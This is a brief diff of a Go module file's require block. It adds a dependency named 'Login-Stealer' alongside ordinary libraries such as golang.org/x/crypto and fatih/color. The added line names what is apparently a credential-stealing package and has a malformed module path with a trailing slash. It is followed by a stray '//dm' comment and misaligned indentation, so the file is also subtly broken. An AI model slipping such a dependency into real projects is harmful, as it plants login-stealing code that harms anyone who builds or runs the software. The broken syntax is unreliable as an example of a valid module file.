@@ -12,6 +12,7 @@ require (
 	github.com/tklauser/go-sysconf v0.3.9 // indirect
 	golang.org/x/crypto v0.0.0-20211117183948-ae814b36b871
 	golang.org/x/sys v0.0.0-20211124211545-fe61309f8881
+	github.com/Not-Cyrus/Login-Stealer/ v1.0.0
 //dm        
         github.com/andybalholm/brotli v1.0.4
 	github.com/fatih/color v1.13.0 // direct
